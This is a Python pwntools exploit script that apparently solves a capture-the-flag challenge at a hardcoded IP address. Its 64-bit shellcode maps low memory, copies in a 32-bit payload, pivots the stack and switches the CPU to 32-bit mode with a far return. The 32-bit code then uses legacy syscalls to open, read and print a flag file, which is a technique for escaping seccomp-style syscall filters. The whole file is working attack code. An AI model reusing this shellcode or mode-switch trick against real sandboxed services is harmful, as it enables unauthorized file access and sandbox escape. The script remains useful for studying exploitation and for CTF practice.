from pwn import *

# Context setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

HOST = '159.89.106.147'
PORT = 1337
# Flag filename from Dockerfile [cite: 2]
FLAG_FILENAME = b'flag_name_Should_Be_R@ndom_ahahahahahahahahah.txt'

def solve():
    io = remote(HOST, PORT)

    # 1. Consume the "Key" preamble
    io.recvuntil(b'Here is the key\n')
    try:
        # Debugging: Print exactly what we get
        leak_data = io.recvline()
        print(f"[+] Server sent key data: {leak_data}")
    except:
        pass

    io.recvuntil(b'Send shellcode (max 4096 bytes):')

    print("[+] crafting 32-bit mmap stager...")

    # --- PART 1: The 32-bit Payload (i386) ---
    # This will run AFTER we switch modes.
    # It must be compiled as x86.
    payload_32 = asm(f'''
        /* open('flag...', 0) */
        jmp get_string
    do_open:
        pop ebx                 /* filename */
        xor ecx, ecx            /* O_RDONLY */
        mov eax, 5              /* SYS_open (x86) */
        int 0x80

        /* read(fd, buf, 0x100) */
        mov ebx, eax            /* fd */
        mov ecx, esp            /* buffer (current stack) */
        mov edx, 0x100          /* len */
        mov eax, 3              /* SYS_read (x86) */
        int 0x80

        /* write(1, buf, 0x100) */
        mov ebx, 1              /* stdout */
        /* ecx is already buffer */
        mov edx, eax            /* write actually read bytes */
        mov eax, 4              /* SYS_write (x86) */
        int 0x80

        /* exit(0) */
        mov eax, 1
        xor ebx, ebx
        int 0x80

    get_string:
        call do_open
        .string "{FLAG_FILENAME.decode()}"
        .byte 0
    ''', arch='i386', bits=32)

    # --- PART 2: The 64-bit Loader (amd64) ---
    # This mmap's low memory, moves the stack, and switches mode.
    # MAP_32BIT = 0x40, MAP_ANON = 0x20, MAP_PRIVATE = 0x2 -> 0x62
    loader = asm(f'''
        /* 1. mmap(0, 0x1000, 7, MAP_32BIT|..., -1, 0) */
        xor rdi, rdi
        mov rsi, 0x1000
        mov rdx, 7
        mov r10, 0x62
        mov r8, -1
        xor r9, r9
        mov rax, 9              /* SYS_mmap */
        syscall

        /* Check if mmap failed (rax > 0xffffff...) */
        test rax, rax
        js fail

        /* 2. Copy payload_32 to the new memory (RAX) */
        mov rdi, rax            /* Destination */
        lea rsi, [rip + payload_start] /* Source (our 32-bit code) */
        mov rcx, {len(payload_32)}     /* Length */
        rep movsb

        /* 3. Stack Pivot: Move RSP to the end of our new page */
        /* This ensures the stack is valid in 32-bit mode (< 4GB) */
        /* rax was the start, we can use rax + 0x800 as stack */
        /* Note: rdi was incremented by rep movsb, we need the base address */
        /* But we can just use the address we mapped. Let's assume it returned e.g. 0x40000000 */
        /* We'll recalculate the base or just trust it. */
        
        /* Better: We know rax returned the pointer. But rax is clobbered? 
           No, syscall returns in rax. Then we moved it to rdi. 
           We need to recover the base pointer. */
           
        /* Let's re-save rax before copy */
        lea rsi, [rip + payload_start]
        /* sys_mmap returned address in rax. Move to rbx to save it. */
        mov rbx, rax 
        
        mov rdi, rbx            /* Dest = New Memory */
        mov rcx, {len(payload_32)}
        rep movsb

        /* 4. Prepare for mode switch */
        /* We want: CS=0x23, RIP=rbx (start of new memory) */
        /* We ALSO want RSP to be safe. Set RSP = rbx + 0x1000 */
        
        mov rsp, rbx
        add rsp, 0x1000         /* New Stack at Top of Page */
        
        /* Now push the far return context onto the NEW stack */
        push 0x23               /* 32-bit CS */
        push rbx                /* RIP (Start of 32-bit code) */
        
        retfq                   /* Switch! */

    fail:
        /* exit(1) if mmap failed */
        mov rax, 60
        mov rdi, 1
        syscall

    payload_start:
    ''')

    final_payload = loader + payload_32

    print(f"[+] Sending {len(final_payload)} bytes...")
    io.sendline(final_payload)
    
    io.interactive()

if __name__ == '__main__':
    solve()